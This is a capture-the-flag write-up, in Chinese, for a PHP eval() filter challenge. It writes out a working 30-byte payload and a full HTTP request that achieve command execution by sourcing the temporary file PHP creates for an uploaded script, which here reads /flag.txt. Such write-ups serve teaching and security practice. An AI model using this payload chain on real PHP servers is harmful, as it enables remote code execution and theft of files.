# 这是……Webshell？Revenge

## 题目简述

Revenge 版本在原有字母数字黑名单上继续禁止 `_` 和 `$`，并把 `shell` 长度限制为 35 字节，已经无法方便地在 PHP 中构造超全局变量。突破口是 multipart 上传文件：PHP 在处理当前请求时会把文件保存为 `/tmp/phpXXXXXX`，而 shell 可以只用通配符定位并通过 `.` 命令执行这个临时文件。

## 解题过程

服务端约束为：

```php
if (strlen($shell) > 35) {
    die("Too long");
}

if (preg_match('/[A-Za-z0-9_$]+/', $shell)) {
    die("Hacker");
}

eval($shell);
```

使用下面的 PHP 载荷：

```php
?><?=`. /???/????????[@-[]`;?>
```

各部分含义如下：

- `?>` 先离开 `eval()` 当前的 PHP 代码区，`<?= ... ?>` 再用短回显标签输出表达式结果；
- 反引号是 PHP 的 shell 执行运算符；
- `. 文件名` 是 POSIX shell 的 source 命令，会在当前 shell 中执行文件内容；
- `/???/` 可匹配 `/tmp/`；
- `????????[@-[]` 共匹配 9 个字符，其中 `[@-[]` 是 ASCII 范围 `@` 到 `[`，可匹配大写字母，从而定位形如 `phpXXXXXX` 且末位为大写字母的上传临时文件。

在 URL 查询串中，`+` 会被解码为空格，所以实际发送时用 `.+/` 表示 `. /`；问号则编码为 `%3F`，避免影响查询串解析。完整请求如下：

```http
POST /?shell=?><?=`.+/%3F%3F%3F/%3F%3F%3F%3F%3F%3F%3F%3F[%40-[]`%3B?> HTTP/1.1
Host: challenge.example
Content-Type: multipart/form-data; boundary=---------110

-----------110
Content-Disposition: form-data; name="file"; filename="run.sh"
Content-Type: application/octet-stream

#!/bin/sh
cat /flag.txt
-----------110--
```

PHP 解析 multipart 请求后，上传内容在本次请求结束前仍位于 `/tmp/phpXXXXXX`。`eval()` 中的通配符由 shell 展开，source 临时脚本后执行 `cat /flag.txt`，命令输出经反引号捕获，再由 `<?= ... ?>` 写回响应。

临时文件名末位是随机字符，而模式 `[@-[]` 只接受大写范围；若当前请求没有匹配到文件，重新发送即可。限制末位范围能显著减少 `/bin`、`/etc` 等三字符目录下普通文件造成的误匹配。

解码后的 PHP 载荷长度为 30 字节，并且不包含字母、数字、下划线或美元符号，满足两项检查。

## 方法总结

本题把 PHP 语法、URL 表单解码、multipart 临时文件和 shell glob 串成了一条跨层利用链。遇到极短且禁止变量的 `eval()` 时，不一定要继续在 PHP 内构造函数名；若同一请求还能制造服务器端临时文件，就可以让极短载荷只负责定位和执行文件，把复杂命令移到不受过滤的上传内容中。
